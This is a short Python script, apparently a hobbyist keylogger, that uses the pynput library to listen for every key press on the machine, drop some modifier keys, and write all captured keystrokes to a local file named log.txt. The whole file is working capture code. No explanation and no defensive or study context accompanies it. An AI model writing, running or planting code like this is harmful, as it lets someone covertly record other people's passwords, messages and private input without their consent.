from pynput.keyboard import Key, Listener
from os.path import exists

keys = []


def onPressKey(key):
    global keys
    if key != Key.caps_lock and key != Key.cmd and key != Key.ctrl and key != Key.tab and key != Key.backspace and key != Key.alt and key != Key.shift:
        if key == Key.space:
            key = " "
        print("{} Key was pressed: ".format(key))
        keys.append(key)

    # print(keys)
    text = ""
    for i in keys:
        i = str(i)
        text +=i
    with open("log.txt", "w") as f:
        f.write(text)
        
        
        

def onReleaseKey(key):
    pass


def startApp():
    print("App started ...")
    #1. Check if the necessary file exists: log.txt
    if not exists("log.txt"):
        #the file does not exist..create it
        with open("log.txt", "w") as f:
            f.write("")

    

    ## the listeners
    with Listener(on_press=onPressKey, on_release=onReleaseKey) as listener:
        listener.join()


startApp() # start the application